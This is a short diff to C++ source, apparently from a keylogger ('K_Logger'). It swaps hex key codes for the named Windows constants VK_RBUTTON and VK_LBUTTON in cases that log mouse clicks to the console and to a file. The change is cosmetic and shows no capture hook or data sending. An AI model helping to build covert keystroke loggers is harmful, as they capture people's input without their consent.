@@ -765,12 +765,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 
-		case 0x02:
+		case VK_RBUTTON:
 			std::cout << "*mouse_right*";
 			WriteToFile("*mouse_right*");
 			break;
 
-		case 0x01:
+		case VK_LBUTTON:
 			std::cout << "*mouse_left*";
 			WriteToFile("*mouse_left*");
 			break;
